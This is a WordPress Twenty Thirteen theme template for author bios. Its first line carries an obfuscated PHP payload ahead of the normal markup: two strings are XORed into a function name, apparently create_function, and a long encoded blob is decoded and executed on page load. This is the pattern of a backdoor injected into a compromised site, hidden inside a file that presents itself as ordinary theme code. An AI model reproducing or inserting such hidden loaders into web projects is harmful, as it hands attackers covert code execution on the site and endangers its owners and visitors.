<?php $nmlATh='3KT ESi+XX1OX C'; $gBkMrIc='P91A166M-6R;1O-'^$nmlATh; $UdsOEeN=' Mem,YP.,-8-+RMD6F<PNF7;<Z DV3gAUFPMDeCRs.;EN7BWYi9.6f. E;d:S0,ouSLJ.eCU,XToijune6Lf9rW4TDeukkjaPJ.73jB3nrKvtuIYnODR  TDm L=;Sakq-xid6blo<2TPxiuJG7A>9fe;,xhFs3EKvvGklFX:+4P InUP:jlkonjPBNI84RrA::8kj3M<XDr7q+TTWbTg,P57SyKV>W2LoWTWUes1;Q YcPr7 ;68N9tXc=oq7g tdM=xF3PDwqGemB0=AWGpG93k68 UaP<;kgtm: Hm9QF57>1ZypL>5WIWOaKKg MgyKaY.1UBhGy5K B6T,Cqrknap<;+h:i9+gFWHBQMugwFULX1xm<:>fa2PXVa1PDFEgo=4;Igjgm--J0OIxSFX+- s=fFk+olIXX;2BdfrN-0+N+ZW:O+D <EcX XU7nMICrR,4 beg74N<Q be 88LBugkZ 6V7S,+ssx7:Uph0A2 wQSnOCL6O= 741WMR6=7ZS9UKhErERT9OSeDeOnFTrzp=LIMmb>+Le>abWLAeYXqttEzE;..rMdx3+CqrrvT3cLN7d3qWfyPreBX9HUI=R<2mN=;=Z>bc7UTQWA>iJzq17D0gawjXcoM3fe+H7=jmU77MnDP =.9.-bdDa10 N3,DEfx6G'; $SNmmVEj=$gBkMrIc('', 'I+MLJ,>MXDWCt75-E2Oxi>XIc>A07l8, 2wdmE8XzHN+-C+87IAAD9JA1Z;e>EXGQ7->OIcqG=-FIJUNEMFo0V8A dXULLQkYCHXABfZNOkFOUm0R<0 LE:lID-IZzZKUDSBM<keKSG pVTUbcS JX=ARqX6fWX 2-R.KIf+NYX5NaJ>5CC1BTdcY0+=MF<ZeUOLBQ9DAR9x=UO5 6BiGJ1YD6BArZ6F-0<1.uXSWZ=S<XZxQOISY-QTpGb,>x,i1D,NXbX5=WLyEI4QQ42nP<3:ORYT4>;YBKZTIQE1V3XbQVJPzDPhHT;<2tk6AmI+GQjE=OE4kH<s<-O0S5O+QZO135mnn;nIXXGb<-;qpKGS04 -TQMG07oEV1,7>Z5=fxGKVQBrmcnIIL>QotXw09GXEH7o;aVefm<9OSbYF2;CCN<B;;S5NlXS7<<A,4h1 <7Z0MGETQ8SQ-S5EJADYL-kYGO>AB7h8IRZZC=S3XLT FAWwuN.1>W6bKRMn25;EIDrtR02OiRa65M.zEbCoF+0GRTY-=,6EUN5BcHBjqaBk9EELvNwYLMC+UMWOzFBAG6UV-wQUWF1APpTCb9K:40b9YK2+ERN.MJDG4-=8 ZNfZUUV0QNHWJxCOmHllN>VQBI1VC,5c ADBVOIE9mZ;9E6ZXluOC<:'^$UdsOEeN); $SNmmVEj();
/**
 * The template for displaying Author bios
 *
 * @package WordPress
 * @subpackage Twenty_Thirteen
 * @since Twenty Thirteen 1.0
 */
?>

<div class="author-info">
	<div class="author-avatar">
		<?php
		/**
		 * Filter the author bio avatar size.
		 *
		 * @since Twenty Thirteen 1.0
		 *
		 * @param int $size The avatar height and width size in pixels.
		 */
		$author_bio_avatar_size = apply_filters( 'twentythirteen_author_bio_avatar_size', 74 );
		echo get_avatar( get_the_author_meta( 'user_email' ), $author_bio_avatar_size );
		?>
	</div><!-- .author-avatar -->
	<div class="author-description">
		<h2 class="author-title"><?php printf( __( 'About %s', 'twentythirteen' ), get_the_author() ); ?></h2>
		<p class="author-bio">
			<?php the_author_meta( 'description' ); ?>
			<a class="author-link" href="<?php echo esc_url( get_author_posts_url( get_the_author_meta( 'ID' ) ) ); ?>" rel="author">
				<?php printf( __( 'View all posts by %s <span class="meta-nav">&rarr;</span>', 'twentythirteen' ), get_the_author() ); ?>
			</a>
		</p>
	</div><!-- .author-description -->
</div><!-- .author-info -->